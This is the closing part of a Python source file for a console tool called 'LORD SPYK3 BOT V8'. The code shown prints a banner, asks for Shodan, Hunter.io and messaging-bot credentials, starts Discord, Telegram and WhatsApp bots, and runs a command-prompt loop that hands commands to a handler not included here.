║{Colors.PURPLE3}  • 🔒 IP Management & Blocking      • 📊 System Monitoring                 {Colors.PURPLE1}║
║{Colors.PURPLE3}  • 🤖 Discord/Telegram/WhatsApp     • 🔌 Signal/Slack/iMessage             {Colors.PURPLE1}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.WARNING}💡 Type 'help' for commands | 'status' for system status{Colors.RESET}
{Colors.WARNING}🔐 Type 'ssh list' to see SSH connections{Colors.RESET}
{Colors.WARNING}🔍 Type 'shodan stats' to check Shodan status{Colors.RESET}
{Colors.WARNING}📧 Type 'hunter stats' to check Hunter.io status{Colors.RESET}
"""
        print(banner)
    
    def setup_apis(self):
        """Setup Shodan and Hunter.io APIs"""
        print(f"\n{Colors.PURPLE4}🔍 API Configuration{Colors.RESET}")
        print(f"{Colors.PURPLE3}{'='*50}{Colors.RESET}")
        
        # Shodan
        if not self.shodan.available:
            setup = input(f"{Colors.YELLOW}Setup Shodan API? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                api_key = input(f"{Colors.YELLOW}Enter Shodan API key: {Colors.RESET}").strip()
                if api_key:
                    self.shodan.save_config(api_key)
                    print(f"{Colors.SUCCESS}✅ Shodan configured!{Colors.RESET}")
        
        # Hunter.io
        if not self.hunter.available:
            setup = input(f"{Colors.YELLOW}Setup Hunter.io API? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                api_key = input(f"{Colors.YELLOW}Enter Hunter.io API key: {Colors.RESET}").strip()
                if api_key:
                    self.hunter.save_config(api_key)
                    print(f"{Colors.SUCCESS}✅ Hunter.io configured!{Colors.RESET}")
    
    def setup_bots(self):
        """Setup messaging bots"""
        print(f"\n{Colors.PURPLE4}🤖 Bot Configuration{Colors.RESET}")
        print(f"{Colors.PURPLE3}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.YELLOW}Setup Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.YELLOW}Enter Discord bot token: {Colors.RESET}").strip()
            prefix = input(f"{Colors.YELLOW}Enter command prefix (default: !): {Colors.RESET}").strip() or "!"
            if token:
                self.discord.save_config(token, "", True, prefix)
                self.discord.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Discord bot started!{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.YELLOW}Setup Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            api_id = input(f"{Colors.YELLOW}Enter API ID: {Colors.RESET}").strip()
            api_hash = input(f"{Colors.YELLOW}Enter API Hash: {Colors.RESET}").strip()
            bot_token = input(f"{Colors.YELLOW}Enter Bot Token (optional): {Colors.RESET}").strip()
            if api_id and api_hash:
                self.telegram.save_config(api_id, api_hash, bot_token, True)
                self.telegram.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ Telegram bot started!{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.YELLOW}Setup WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.YELLOW}Enter WhatsApp phone number: {Colors.RESET}").strip()
            prefix = input(f"{Colors.YELLOW}Enter command prefix (default: /): {Colors.RESET}").strip() or "/"
            if phone:
                self.whatsapp.save_config(phone, True, prefix)
                self.whatsapp.start_bot_thread()
                print(f"{Colors.SUCCESS}✅ WhatsApp bot started!{Colors.RESET}")
    
    def run(self):
        """Main application loop"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        self.setup_apis()
        self.setup_bots()
        
        print(f"\n{Colors.SUCCESS}✅ Tool ready!{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PURPLE1}[{Colors.PURPLE2}lord-spyk3{Colors.PURPLE1}]{Colors.RESET} > "
                command = input(prompt).strip()
                
                if command.lower() == 'exit':
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                elif command.lower() == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.print_banner()
                else:
                    result = self.handler.execute(command)
                    if result['success']:
                        output = result.get('output', '') or result.get('data', '')
                        if isinstance(output, dict):
                            print(json.dumps(output, indent=2))
                        else:
                            print(output)
                        print(f"\n{Colors.SUCCESS}✅ Command executed ({result['execution_time']:.2f}s){Colors.RESET}")
                    else:
                        print(f"\n{Colors.ERROR}❌ Command failed: {result.get('output', 'Unknown error')}{Colors.RESET}")
            
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
        
        self.whatsapp.stop()
        self.db.close()

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.PURPLE4}👑 Starting LORD SPYK3 BOT V8...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7 or higher required{Colors.RESET}")
            sys.exit(1)
        
        # Check for root/admin
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            import ctypes
            try:
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Running without admin privileges - firewall operations limited{Colors.RESET}")
        
        app = LordSpyk3App()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()